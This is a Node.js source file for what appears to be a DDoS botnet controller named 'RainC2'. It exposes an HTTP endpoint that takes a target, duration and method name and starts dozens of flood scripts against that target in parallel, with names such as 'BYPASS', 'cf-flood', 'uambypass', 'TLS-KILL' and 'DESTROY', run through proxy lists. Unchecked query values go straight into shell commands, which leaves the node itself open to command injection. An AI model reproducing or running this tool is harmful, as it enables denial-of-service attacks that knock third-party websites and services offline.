const express = require('express');
const { exec } = require('child_process');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5552;
const scrapeProxies = require('./proxy.js');

async function fetchData() {
  const response = await fetch('https://httpbin.org/get');
  const data = await response.json();
  console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
  return data;
}

app.get('/RainC2', (req, res) => {
  const { target, time, methods } = req.query;

  res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target,
    time,
    methods
  });

  // Eksekusi sesuai methods
  if (methods === 'HTTP-SICARIO') {
    console.log('received');
    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
    exec(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
    exec(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);
    exec(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);
                exec(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
            exec(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);
            exec(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);
            exec(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);
            exec(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
            exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
            exec(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
            exec(`node methods/http-panel.js ${target} ${time}`);
            exec(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
            // Saturation Layer - All your other bullshit commands
            exec(`node methods/strike.js GET ${target} ${time} 10 90 proxy.txt --full --legit`);
            exec(`node methods/Rex.js ${target} ${time} 64 10 proxy.txt`);
            exec(`node methods/tls.js ${target} ${time} 100 10`);
            exec(`node methods/flood.js ${target} ${time}`);
            exec(`node methods/spike.js ${target} 10 ${time}`);
            exec(`node methods/h2blast.js ${target} ${time} 30 10 proxy.txt`);
            exec(`node methods/lovenet-steven.js ${target} ${time} 65 15 proxy.txt`);
            exec(`node methods/raw.js ${target} ${time}`);
            exec(`node methods/flash.js ${target} ${time} 65 15 proxy.txt`);
  } else if (methods === 'RAW-HTTP') {
    console.log('received');
    exec(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
    exec(`node methods/http-panel.js ${target} ${time}`);
  } else if (methods === 'R9') {
    console.log('received');
    exec(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
    exec(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
    exec(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
    exec(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);
    exec(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
                exec(`node methods/rawcaptcha.js ${target} 60 5 4 6`);
            exec(`node methods/browsersun.js ${target} proxy.txt 10 120 100 30`);
            exec(`node methods/kbrowser.js ${target} proxy.txt 10 120 100 30`);
            exec(`node methods/tlsop.js ${target} ${time} 100 10 proxy.txt`);
            exec(`node methods/gravitus.js ${target} ${time} 30 10 proxy.txt`);
            exec(`node methods/storm.js ${target} ${time} 100 10 proxy.txt`);
            exec(`node methods/DESTROY.js ${target} ${time} 100 10 proxy.txt`);
            exec(`node methods/thunder.js ${target} ${time} 100 10 proxy.txt`);
            exec(`node methods/lovenet-flash.js ${target} ${time} 65 15 proxy.txt`);
            exec(`node methods/bypass2.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === 'PRIV-TOR') {
    console.log('received');
    exec(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
    exec(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`);
    exec(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
    exec(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`);
    exec(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
  } else if (methods === 'HOLD-PANEL') {
    console.log('received');
    exec(`node methods/http-panel.js ${target} ${time}`);
  } else if (methods === 'R1') {
    console.log('received');
            exec(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
            exec(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);
            exec(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);
            exec(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);
            exec(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
            exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
            exec(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
            exec(`node methods/http-panel.js ${target} ${time}`);
            exec(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
            // Saturation Layer - All your other bullshit commands
            exec(`node methods/strike.js GET ${target} ${time} 10 90 proxy.txt --full --legit`);
            exec(`node methods/Rex.js ${target} ${time} 64 10 proxy.txt`);
            exec(`node methods/tls.js ${target} ${time} 100 10`);
            exec(`node methods/flood.js ${target} ${time}`);
            exec(`node methods/spike.js ${target} 10 ${time}`);
            exec(`node methods/h2blast.js ${target} ${time} 30 10 proxy.txt`);
            exec(`node methods/lovenet-steven.js ${target} ${time} 65 15 proxy.txt`);
            exec(`node methods/raw.js ${target} ${time}`);
            exec(`node methods/flash.js ${target} ${time} 65 15 proxy.txt`);
            exec(`node methods/space.js ${target} ${time} 65 15 proxy.txt`);
            exec(`node methods/gojov5.js ${target} ${time} 100 10 proxy.txt`);
            exec(`node methods/TLS-KILL.js ${target} ${time} 100 10 proxy.txt`);
            exec(`node methods/rawcaptcha.js ${target} 60 5 4 6`);
            exec(`node methods/browsersun.js ${target} proxy.txt 10 120 100 30`);
            exec(`node methods/kbrowser.js ${target} proxy.txt 10 120 100 30`);
            exec(`node methods/tlsop.js ${target} ${time} 100 10 proxy.txt`);
            exec(`node methods/gravitus.js ${target} ${time} 30 10 proxy.txt`);
            exec(`node methods/storm.js ${target} ${time} 100 10 proxy.txt`);
            exec(`node methods/DESTROY.js ${target} ${time} 100 10 proxy.txt`);
            exec(`node methods/thunder.js ${target} ${time} 100 10 proxy.txt`);
            exec(`node methods/lovenet-flash.js ${target} ${time} 65 15 proxy.txt`);
            exec(`node methods/bypass2.js ${target} ${time} 100 10 proxy.txt`);
            exec(`node methods/god.js ${target} ${time} 100 10`);
            exec(`node methods/cf-flood.js ${target} ${time}`);
            exec(`node methods/browser.js ${target} ${time}`);
            exec(`node methods/R-GOST.js ${target} ${time} 30 10 proxy.txt`);
            exec(`node methods/kill.js ${target} ${time} 30 10`);
            exec(`node methods/Traffic GET ${target} 10`);
            exec(`node methods/Traffic POST ${target} 10`);
            exec(`node methods/Traffic OPTIONS ${target} 10`);
            exec(`node methods/Traffic HEAD ${target} 10`);
            exec(`node methods/h2ca.js ${target} ${time} 100 10 proxy.txt`);
            exec(`node methods/HTTP-VIP.js ${target} ${time} 100 10 proxy.txt`);
            exec(`node methods/lovenet-space.js ${target} ${time} 65 15 proxy.txt`);
            exec(`node methods/spike ${target} 10 ${time}`);
            exec(`node methods/uambypass.js ${target} ${time} 100 proxy.txt`);
            exec(`node methods/reclopsus.js ${target} ${time} 30 10 proxy.txt`);
            exec(`node methods/novaria.js ${target} ${time} 32 10 proxy.txt`);
            exec(`node methods/rape.js GET ${time} 10 proxy.txt 100 ${target}`);
            exec(`node methods/TORNADOV2.js GET ${target} ${time} 10 100 proxy.txt`);
            exec(`node methods/RAW-MIX.js ${target} ${time}`);
            exec(`node methods/drown.js ${target} ${time} 10 100`);
            exec(`node methods/idk.js ${target} ${time} 100 10 proxy.txt`);
            exec(`node methods/cookie.js ${target} ${time} 10 100 proxy.txt`);
            exec(`node methods/YAT-TLS.js ${target} ${time} 100 10 proxy.txt`);
  }
});

app.listen(port, () => {
  fetchData();
});
